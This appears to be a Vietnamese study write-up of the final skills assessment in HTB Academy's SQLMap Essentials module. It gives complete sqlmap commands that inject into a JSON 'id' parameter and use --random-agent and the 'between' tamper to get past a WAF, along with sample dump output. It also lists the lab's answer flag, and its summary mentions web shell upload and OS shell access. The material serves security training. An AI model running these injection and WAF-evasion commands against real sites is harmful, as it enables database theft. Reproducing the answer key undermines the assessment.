# Đánh Giá Kỹ Năng Tổng Hợp (Skills Assessment)

> **HTB Academy Module 58: SQLMap Essentials - Section 11 / 11**  
> *Đường dẫn bài học: `05-skills-assessment/01-skills-assessment.md`*

---

## 1. Tổng Quan Kịch Bản Thực Chiến (Scenario Overview)

Bạn được cấp quyền truy cập vào một ứng dụng web thương mại điện tử thực tế có triển khai các cơ chế bảo vệ cơ bản. Nhiệm vụ của bạn là vận dụng toàn bộ kỹ năng đã học trong suốt module để:
1. Thám sát (Reconnaissance) ứng dụng web để tìm ra điểm tiêm (Injection Point).
2. Xác định các cơ chế bảo vệ đang hoạt động (WAF / Filter / Headers).
3. Thiết lập lệnh SQLMap hoàn chỉnh với các tùy chọn tinh chỉnh (Attack Tuning & Tamper Scripts) để vượt qua các lớp bảo vệ.
4. Khai thác và trích xuất lá cờ cuối cùng nằm trong bảng **`final_flag`**.

---

## 2. Quy Trình Khai Thác Thực Chiến Từng Bước

Sau khi nhấn **Spawn the target system**, bạn sẽ nhận được địa chỉ IP và Port: `http://<TARGET_IP>:<PORT>/`.

---

### Bước 1: Thám Sát & Bắt HTTP Request (Traffic Reconnaissance)
1. Mở trình duyệt truy cập vào trang web `http://<TARGET_IP>:<PORT>/`.
2. Bật **Developer Tools** (F12) $\rightarrow$ Chuyển sang tab **Network** (hoặc mở Burp Suite để chặn bắt lưu lượng).
3. Duyệt trang web vào mục **Catalog / Shop**.
4. Tìm một món hàng và bấm nút **"Add to Cart +"** (Thêm vào giỏ hàng).
5. Quan sát trong tab Network, bạn sẽ thấy một HTTP **POST request** được gửi tới đường dẫn `/action.php` với dữ liệu định dạng **JSON**:
   ```json
   {"id": 1}
   ```

---

### Bước 2: Lưu HTTP Request Ra Tệp Tin (`request.req`)
Lưu toàn bộ nội dung request từ Burp Suite hoặc Copy Request Headers từ trình duyệt vào một file văn bản đặt tên là `request.req`:

```http
POST /action.php HTTP/1.1
Host: <TARGET_IP>:<PORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Connection: close

{"id": 1*}
```
*(Đặt dấu hoa thị `*` ngay sau số 1 bên trong JSON `{"id": 1*}` để chỉ định SQLMap tập trung tấn công đúng tham số `id`)*.

---

### Bước 3: Phân Tích Lớp Phòng Thủ & Lựa Chọn Cờ SQLMap Phù Hợp
Khi thử chạy các payload đơn giản, máy chủ không trả về kết quả vì:
1. **Kiểm tra User-Agent**: Máy chủ chặn công cụ tự động $\rightarrow$ Thêm cờ **`--random-agent`** để giả lập trình duyệt hợp lệ.
2. **Bộ lọc WAF chặn ký tự so sánh**: WAF chặn các ký tự `<`, `>` $\rightarrow$ Dùng Tamper script **`--tamper=between`** để chuyển đổi logic so sánh.
3. **Mức độ kiểm tra**: Nâng cấp độ thử nghiệm lên tối đa với **`--level=5 --risk=3`** để mở rộng tập boundaries và vectors.
4. **Kỹ thuật tiêm**: Kỹ thuật hiệu quả nhất trên mục tiêu này là Time-based blind $\rightarrow$ Gắn **`--technique=T`** (hoặc để SQLMap tự động nhận diện).
5. **Mục tiêu trích xuất**: Yêu cầu đề bài là lấy nội dung bảng `final_flag` $\rightarrow$ Thêm tham số **`-T final_flag --dump`**.

---

### Bước 4: Thực Thi Lệnh Khai Thác Hoàn Chỉnh

Chạy câu lệnh SQLMap sau trên terminal:

```bash
sqlmap -r request.req \
  --level=5 \
  --risk=3 \
  --random-agent \
  --tamper=between \
  --technique=T \
  -T final_flag \
  --dump \
  --batch
```

*Hoặc nếu không dùng file request, bạn có thể truyền thẳng qua URL và POST data:*
```bash
sqlmap -u "http://<TARGET_IP>:<PORT>/action.php" \
  -H "Content-Type: application/json" \
  --data='{"id": 1*}' \
  --level=5 \
  --risk=3 \
  --random-agent \
  --tamper=between \
  --technique=T \
  -T final_flag \
  --dump \
  --batch
```

---

### Bước 5: Kết Quả Trích Xuất & Thu Thập Flag

SQLMap sẽ tự động nhận diện điểm tiêm Time-based blind, vượt qua bộ lọc WAF bằng script `between` và tiến hành trích xuất từng ký tự của bảng `final_flag`:

```console
[INFO] parsing HTTP request from 'request.req'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] Y
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if HTTP parameter 'JSON id' is dynamic
...SNIP...
[INFO] HTTP parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
...SNIP...
Database: dev
Table: final_flag
[1 entry]
+----+---------------------------+
| id | flag                      |
+----+---------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!}  |
+----+---------------------------+
[INFO] table 'dev.final_flag' dumped to CSV file
```

---

## 3. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Phương Pháp & Lệnh Khai Thác | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the contents of table final_flag?* | `sqlmap -r request.req --level=5 --risk=3 --random-agent --tamper=between -T final_flag --dump --batch` | **`HTB{n07_50_h4rd_r16h7?!}`** |

---

## 4. Tổng Kết Toàn Bộ Module SQLMap Essentials

Chúc mừng bạn đã hoàn thành xuất sắc toàn bộ khóa học **SQLMap Essentials**! Qua 11 sections thực chiến, bạn đã trang bị đầy đủ các kỹ năng quan trọng nhất:
1. **Kiến trúc & 6 kỹ thuật `BEUSTQ`**: Hiểu rõ khi nào dùng Boolean, Error, UNION, Stacked, Time-based, Inline.
2. **Quản trị Request chuyên nghiệp**: Nạp raw request từ Burp Suite (`-r`), cấu hình Headers, Cookie, và dữ liệu JSON/XML.
3. **Kỹ năng gỡ lỗi (Debugging)**: Xem lỗi DBMS bằng `--parse-errors`, lưu vết traffic `-t`, điều chỉnh verbosity `-v 6`, và tích hợp Burp Proxy `--proxy`.
4. **Tinh chỉnh tham số tấn công**: Bẻ khóa boundaries với `--prefix`/`--suffix`, mở rộng mức độ `--level 5 --risk 3`, và ép số cột `--union-cols`.
5. **Khai thác CSDL chuyên sâu**: Trích xuất schema, tìm kiếm thông minh `--search -C`, và bẻ khóa hash mật khẩu đa tiến trình.
6. **Vượt rào WAF / Filter**: Tự động parse Anti-CSRF token, làm mới tham số `--randomize`, giả lập `--random-agent`, và vận dụng Tamper Scripts (`between`, `space2comment`...).
7. **Chiếm quyền hệ điều hành**: Đọc file tùy ý (`--file-read`), tải Web Shell lên máy chủ (`--file-write`), và mở shell tương tác (`--os-shell`).

---
*Edit by me and AI.*
